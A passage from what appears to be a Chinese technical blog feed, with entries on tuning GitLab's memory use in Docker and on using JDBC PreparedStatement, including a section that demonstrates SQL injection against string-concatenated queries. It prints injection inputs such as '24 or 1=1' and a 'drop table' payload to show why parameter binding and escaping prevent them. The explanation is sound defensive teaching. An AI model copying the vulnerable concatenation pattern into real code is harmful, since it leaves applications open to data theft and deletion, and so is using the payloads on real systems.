src="/../blog-assets/Jenkins%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1657025661533.png" alt="1657025661533"></p><p>安装成功</p><p><img src="/../blog-assets/Jenkins%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1657025778183.png" alt="1657025778183"></p>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>jenkins</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GitLab内存占用过高解决方案</title>
    <link href="/2022/07/02/Gitlab%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2022/07/02/Gitlab%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<h1 id="GitLab内存占用过高解决方案"><a href="#GitLab内存占用过高解决方案" class="headerlink" title="GitLab内存占用过高解决方案"></a>GitLab内存占用过高解决方案</h1><h1 id="一、问题发现与排查"><a href="#一、问题发现与排查" class="headerlink" title="一、问题发现与排查"></a>一、问题发现与排查</h1><blockquote><p>前提：服务器CPU内存信息为2C4G</p></blockquote><p>近来发现，每当推送代码，gitlab服务器很大概率会卡死；<code>htop</code> 命令查看服务器运行情况，发现内存占用在90%以上，使用以下命令查询占用内存最多的十个进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux|<span class="hljs-built_in">head</span> -1;ps aux|grep -v PID|<span class="hljs-built_in">sort</span> -rn -k +4|<span class="hljs-built_in">head</span><br></code></pre></td></tr></table></figure><p>果然，基本吃内存大户都为 gitlab 的进程，主要需要解决<code>worker</code> 和 <code>sidekiq</code> 高占用</p><p><img src="/../blog-assets/Gitlab%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1656664601696.png" alt="1656664601696"></p><h1 id="二、问题分析"><a href="#二、问题分析" class="headerlink" title="二、问题分析"></a>二、问题分析</h1><blockquote><p>参考官方硬件要求： <a href="https://docs.gitlab.com/ee/install/requirements.html#cpu">GitLab installation minimum requirements | GitLab</a> </p></blockquote><h2 id="1-worker-进程"><a href="#1-worker-进程" class="headerlink" title="1. worker 进程"></a>1. worker 进程</h2><p>参考以下总结：</p><p><img src="/../blog-assets/Gitlab%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1656664846812.png" alt="1656664846812"></p><p>结合官方文档，<code>unicorn[&#39;worker_processess&#39;]</code> 需设置一个合适的值，官方推荐设置为物理核心数+1</p><h2 id="2-sidekiq-进程"><a href="#2-sidekiq-进程" class="headerlink" title="2. sidekiq 进程"></a>2. sidekiq 进程</h2><p>官方文档中写道</p><blockquote><p>Notice: The 25 workers of Sidekiq will show up as separate processes in your process overview (such as top or htop) but they share the same RAM allocation since Sidekiq is a multithreaded application. Please see the section below about Unicorn workers for information about how many you need of those</p></blockquote><p>翻译中文的意思是：</p><blockquote><p>注意：Sidekiq的25名worker将在您的流程概述（例如top或htop）中显示为单独的进程，但由于Sidekiq是一个多线程应用程序，因此它们共享相同的RAM分配。请参阅以下有关Unicorn worker的部分，了解您需要多少人。</p></blockquote><p>实际我并不需要这么多的worker，修改<code>sidekiq[&#39;concurrency&#39;]</code> （默认25）以减少并发数。</p><h1 id="三、问题解决"><a href="#三、问题解决" class="headerlink" title="三、问题解决"></a>三、问题解决</h1><p>依据以上问题分析，修改配置文件 <code>gitlab.rb</code> ，默认为以下路径（若为容器运行，请修改挂接目录下的配置文件）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/gitlab/gitlab.rb<br></code></pre></td></tr></table></figure><p>最终采用解决方案：</p><h2 id="1-减少-workder-进程数"><a href="#1-减少-workder-进程数" class="headerlink" title="1. 减少 workder 进程数"></a>1. 减少 workder 进程数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#综合考虑服务器配置，经测试2个进程占用也偏高，采用1个进程足矣</span><br>unicorn[<span class="hljs-string">&#x27;worker_processes&#x27;</span>] = 2<br></code></pre></td></tr></table></figure><h2 id="2-减少-worker-进程的内存空间"><a href="#2-减少-worker-进程的内存空间" class="headerlink" title="2. 减少 worker 进程的内存空间"></a>2. 减少 worker 进程的内存空间</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">unicorn[<span class="hljs-string">&#x27;worker_memory_limit_min&#x27;</span>] = <span class="hljs-string">&quot;200 * 1 &lt;&lt; 20&quot;</span><span class="hljs-comment">#默认为400</span><br>unicorn[<span class="hljs-string">&#x27;worker_memory_limit_max&#x27;</span>] = <span class="hljs-string">&quot;350 * 1 &lt;&lt; 20&quot;</span><span class="hljs-comment">#默认为650</span><br></code></pre></td></tr></table></figure><h2 id="3-减少-sidekiq-数据库并发数"><a href="#3-减少-sidekiq-数据库并发数" class="headerlink" title="3. 减少 sidekiq 数据库并发数"></a>3. 减少 sidekiq 数据库并发数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#考虑需求，5个并发足矣</span><br>sidekiq[<span class="hljs-string">&#x27;concurrency&#x27;</span>] = 5<br></code></pre></td></tr></table></figure><h2 id="4-减少数据库缓存"><a href="#4-减少数据库缓存" class="headerlink" title="4. 减少数据库缓存"></a>4. 减少数据库缓存</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#官方推荐为总RAM的1/4，但服务器不只gitlab一个应用，256MB已能满足需求</span><br>postgresql[<span class="hljs-string">&#x27;shared_buffers&#x27;</span>] = <span class="hljs-string">&quot;256MB&quot;</span><br></code></pre></td></tr></table></figure><h2 id="5-重新初始化配置"><a href="#5-重新初始化配置" class="headerlink" title="5. 重新初始化配置"></a>5. 重新初始化配置</h2><p>配置文件修改保存后，重启使配置生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#我的是docker中运行的gitlab，需要先进入容器</span><br>[root@VM-centos]<span class="hljs-comment"># docker exec -it gitlab /bin/bash</span><br><span class="hljs-comment">#执行以下命令使修改后的配置生效</span><br>root@111c370ad:/<span class="hljs-comment"># gitlab-ctl reconfigure</span><br></code></pre></td></tr></table></figure><h2 id="6-效果验证"><a href="#6-效果验证" class="headerlink" title="6. 效果验证"></a>6. 效果验证</h2><p>重启，使用命令查看内存占用，已降至50%左右</p><p><img src="/../blog-assets/Gitlab%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1656671499371.png" alt="1656671499371"></p><p>提交代码，服务器无卡顿，gitlab web端可正常访问；内存占用在几个提交推送后，维持在50%左右</p><p><img src="/../blog-assets/Gitlab%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1656671988496.png" alt="1656671988496"></p><p>至此，问题暂时解决，因为gitlab存在内存泄漏问题，后续待一段时间的提交推送后再观察内存情况。</p><blockquote><p>参考： <a href="https://ouyangpeng.blog.csdn.net/article/details/84066417?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-84066417-blog-122859181.pc_relevant_multi_platform_whitelistv1&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-84066417-blog-122859181.pc_relevant_multi_platform_whitelistv1&utm_relevant_index=1">解决GitLab内存消耗大的问题</a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>gitlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PrepareStatement用法（附源码解析）</title>
    <link href="/2022/07/01/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/07/01/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="PrepareStatement-基本用法"><a href="#PrepareStatement-基本用法" class="headerlink" title="PrepareStatement 基本用法"></a>PrepareStatement 基本用法</h1><h2 id="1-加载驱动"><a href="#1-加载驱动" class="headerlink" title="1. 加载驱动"></a>1. 加载驱动</h2><p>首先在<code>pom.xml</code> 中引入 <code>mysql</code> 依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过以下代码加载驱动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="2-获取-Connection-对象"><a href="#2-获取-Connection-对象" class="headerlink" title="2. 获取 Connection 对象"></a>2. 获取 Connection 对象</h2><p>数据库连接需要数据库链接、用户名、密码三个参数，建议配置在<code>application.properties</code> 中，方便统一管理（当然也可以直接在使用的地方用字符串变量）</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment">#PrepareStatement</span><br><span class="hljs-comment">#数据库链接</span><br><span class="hljs-attr">pstmt.dbUrl</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mydb?serverTimezone=UTC&amp;characterEncoding=utf8&amp;useUnicode=true&quot;</span><br><span class="hljs-comment">#用户名</span><br><span class="hljs-attr">pstmt.dbUser</span>=<span class="hljs-string">root</span><br><span class="hljs-comment">#密码</span><br><span class="hljs-attr">pstmt.dbPwd</span>=<span class="hljs-string">123456</span><br></code></pre></td></tr></table></figure><p>通过以下代码获取connection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(dbUrl,dbUser,dbPwd);<br></code></pre></td></tr></table></figure><h2 id="3-获取-PrepareStatement-对象"><a href="#3-获取-PrepareStatement-对象" class="headerlink" title="3. 获取 PrepareStatement 对象"></a>3. 获取 PrepareStatement 对象</h2><p>根据需求创建Sql语句字符串，在需要加入参数的地方用 <code>?</code> 占位符代替</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//查询符合指定年龄和性别的员工姓名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT a.name FROM staff_info a WHERE a.age = ? and a.sex = ?&quot;</span>;<br></code></pre></td></tr></table></figure><p>接下来，创建 <code>PrepareStatement</code>对象对sql进行预编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);<br></code></pre></td></tr></table></figure><h2 id="4-设置参数"><a href="#4-设置参数" class="headerlink" title="4. 设置参数"></a>4. 设置参数</h2><p><code>PrepareStatement</code>对象提供多种参数类型方法，<strong>使用时依据数据库字段类型一一对应</strong>，设置时需注意第一个参数为占位符<code>?</code> 的索引且<strong>从 1 开始</strong>，例如之前sql的设置应为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">pstmt.setInt(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>);<br>pstmt.setString(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;男&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="5-SQL执行"><a href="#5-SQL执行" class="headerlink" title="5. SQL执行"></a>5. SQL执行</h2><h3 id="单条语句执行"><a href="#单条语句执行" class="headerlink" title="单条语句执行"></a>单条语句执行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//单次查询</span><br>pstmt.executeQuery();<br><span class="hljs-comment">//单次更新</span><br>pstmt.executeUpdate();<br></code></pre></td></tr></table></figure><h3 id="批量执行"><a href="#批量执行" class="headerlink" title="批量执行"></a>批量执行</h3><p>若一次要插入大量数据，应尽量减少jdbc的调用次数，使用批量执行来优化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//第一批</span><br>pstmt.setInt(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>);<br>pstmt.setString(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;男&quot;</span>);<br><span class="hljs-comment">//加入批次</span><br>pstmt.addBatch();<br><br><span class="hljs-comment">//第二批</span><br>pstmt.setInt(<span class="hljs-number">1</span>,<span class="hljs-number">24</span>);<br>pstmt.setString(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;女&quot;</span>);<br>pstmt.addBatch();<br><br><span class="hljs-comment">//统一批量执行</span><br>pstmt.executeBatch();<br></code></pre></td></tr></table></figure><h2 id="6-完整示例"><a href="#6-完整示例" class="headerlink" title="6. 完整示例"></a>6. 完整示例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrepareStatementUtils</span> &#123;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(PrepareStatementUtils.class);<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;pstmt.dbUrl&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span>  String dbUrl;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;pstmt.dbUser&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span>  String dbUser;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;pstmt.dbPwd&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span>  String dbPwd;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">prepareStatementExecute</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//加载 mysql 驱动</span><br>            Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>            <span class="hljs-comment">//获取链接</span><br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(dbUrl,dbUser,dbPwd);<br>            <span class="hljs-comment">//获取preparestatement对象</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT a.name FROM staff_info a WHERE a.age = ? and a.sex = ?&quot;</span>;<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);<br><br>            <span class="hljs-comment">//单次执行</span><br>            pstmt.setInt(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>);<br>            pstmt.setString(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;男&quot;</span>);<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> pstmt.executeQuery();<br><br>            <span class="hljs-comment">//批量执行</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;insert into staff_info(staff_id,staff_name,staff_age,staff_sex) values(?,?,?,?)&quot;</span>;<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt1</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql2);<br>            <span class="hljs-comment">//第一批</span><br>            pstmt1.setString(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;001&quot;</span>);<br>            pstmt1.setString(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;小谭&quot;</span>);<br>            pstmt1.setInt(<span class="hljs-number">3</span>,<span class="hljs-number">35</span>);<br>            pstmt1.setString(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;男&quot;</span>);<br>            <span class="hljs-comment">//加入批次</span><br>            pstmt1.addBatch();<br><br>            <span class="hljs-comment">//第二批</span><br>            pstmt1.setString(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;002&quot;</span>);<br>            pstmt1.setString(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;小高&quot;</span>);<br>            pstmt1.setInt(<span class="hljs-number">3</span>,<span class="hljs-number">24</span>);<br>            pstmt1.setString(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;女&quot;</span>);<br>            pstmt1.addBatch();<br><br>            <span class="hljs-comment">//统一执行</span><br>            pstmt1.executeBatch();<br><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;<br>            LOGGER.error(e.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="SQL注入攻击（附源码解析）"><a href="#SQL注入攻击（附源码解析）" class="headerlink" title="SQL注入攻击（附源码解析）"></a>SQL注入攻击（附源码解析）</h1><blockquote><p><code>SQL注入攻击</code>：  通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它是目前黑客对数据库进行攻击的最常用手段之一。 </p></blockquote><h2 id="1-Statement-发生-SQL-注入的情况"><a href="#1-Statement-发生-SQL-注入的情况" class="headerlink" title="1. Statement 发生 SQL 注入的情况"></a>1. Statement 发生 SQL 注入的情况</h2><p>现存在以下语句查询指定年龄的职工信息，其中age为入参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM staff_info a WHERE a.staff_age =&quot;</span>+age;<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<br></code></pre></td></tr></table></figure><p>若age值为<code>24 or 1=1</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;24 or 1=1&quot;</span>;<br></code></pre></td></tr></table></figure><p>最后的拼接语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> staff_info a <span class="hljs-keyword">WHERE</span> a.staff_age <span class="hljs-operator">=</span> <span class="hljs-number">36</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>会返回该表的所有职工信息；常见的SQL注入还存在于恶意删表，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;24; drop table staff_info&quot;</span>;<br></code></pre></td></tr></table></figure><p>该语句会删除职工信息表，造成严重后果，因此防止SQL注入是必备操作。</p><h2 id="2-PrepareStatement-防止SQL注入源码解析"><a href="#2-PrepareStatement-防止SQL注入源码解析" class="headerlink" title="2. PrepareStatement 防止SQL注入源码解析"></a>2. PrepareStatement 防止SQL注入源码解析</h2><p>同样存在以下语句查询指定年龄和性别的职工信息，其中age和sex为入参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM staff_info a WHERE a.staff_age = ? and a.staff_sex = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);<br></code></pre></td></tr></table></figure><p>同样以SQL注入的形式设置sex参数为 <code>male&#39; or 1=&#39;1</code> ，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">pstmt.setInt(<span class="hljs-number">1</span>,<span class="hljs-number">36</span>); <br>pstmt.setString(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;male&#x27; or 1=&#x27;1&quot;</span>);<br></code></pre></td></tr></table></figure><p>打印一下看看PrepareStatement预编译的语句，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(pstmt);<br></code></pre></td></tr></table></figure><p>从以下结果可知，PrepareStatement会在占位符的两侧加上 <code>&#39;</code> ，但你可能已经发现到目前为止预编译拼接的sql仍然是存在SQL注入风险的sql，若被直接执行，也会返回表的全部信息，别着急，我们接着看；</p><p><img src="/../blog-assets/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/1657001587671.png" alt="1657001587671"></p><p>接下来执行SQL；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rspre</span> <span class="hljs-operator">=</span> pstmt.executeQuery();<br></code></pre></td></tr></table></figure><p>通过 debug 进入 <code>com.mysql.cj.jdbc.ClientPreparedStatement</code> 的 <code>executeQuery()</code>方法</p><p><img src="/../blog-assets/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/1657003187392.png" alt="1657003187392"></p><p>可以看出，在 <code>fillSendPacket()</code> 方法将sql转换为字节的过程中，给占位符中包含的单引号<code>&#39;</code>，额外加上一个单引号 <code>&#39;</code> ，最后执行的sql就变为了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> staff_info a <span class="hljs-keyword">WHERE</span> a.staff_age <span class="hljs-operator">=</span>  <span class="hljs-number">36</span> <span class="hljs-keyword">and</span> a.staff_sex <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;male&#x27;&#x27; or 1=&#x27;&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure><p>该查询返回信息为空，避免了SQL注入；接下来我们继续debug，到底是哪个操作加上了单引号<code>&#39;</code>：</p><p><img src="/../blog-assets/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/1657007813550.png" alt="1657007813550"></p><p>找到 <code>buligComQuery()</code>方法，有如下代码，其中：</p><p><img src="/../blog-assets/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/1657016997387.png" alt="1657016997387"></p><ol><li><code>staticSqlStrings[]</code> ：存储的是以占位符<code>?</code> 划分开的sql语句转换的字节数组，不包含参数，即</li></ol><ul><li><code>staticSqlStrings[0]</code>&#x3D; <code>SELECT * FROM staff_info a WHERE a.staff_age =</code></li><li><code>staticSqlStrings[1]</code> &#x3D; <code>and a.staff_sex =</code></li></ul><ol start="2"><li><code>bindValues[]</code> ：绑定的参数数组</li></ol><p>从以上源码可以看出，sql语句和参数共同组装成 <code>sendPacket</code> 发给远程数据库做执行，而防SQL注入的处理，肯定就在 <code>writeAsText()</code> 流程中；</p><p>我们继续往下，来到 <code>com.mysql.cj.protocol.a.StringValueEncoder</code> 类中，该类用于处理String参数，于是可以定位到在将参数转换为字节数组的 <code>getBytes()</code> 方法中对输入的字符串进行了 <code>StringUtils.escapeString()</code> 处理： <img src="/../blog-assets/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/1657017738145.png" alt="1657017738145"></p><p><img src="/../blog-assets/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/1657017977804.png" alt="1657017977804"></p><p>既然已经发现字符串的工具类调用，不出意外我们马上就要找到答案了</p><p><img src="/../blog-assets/PrepareStatement%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/1657018291198.png" alt="1657018291198"></p><p>果然，功夫不负有心人，我们终于找到了它。</p><p>可以看到方法中对各类特殊字符都做了转义处理，常规的添加斜杠 <code>\</code> 如换行符<code>\n</code> ；而我们这里涉及的单引号 <code>&#39;</code> ，转义时会再添加一个 <code>&#39;</code>， 这也解释了上述最终执行sql 的生成。</p><p>Ps：最近干活用到PrepareStatement，网上提到的PrepareStatement源码解析多为老驱动（做法为添加斜杠<code>\</code> ），实际使用时发现转义后其实添加的是单引号<code>&#39;</code>  ，正好就顺道学习下源码，也借此回顾一下SQL注入。</p>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSS 基础</title>
    <link href="/2022/06/22/CSS%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/06/22/CSS%E5%9F%BA%E7%A1%80/</url>
    
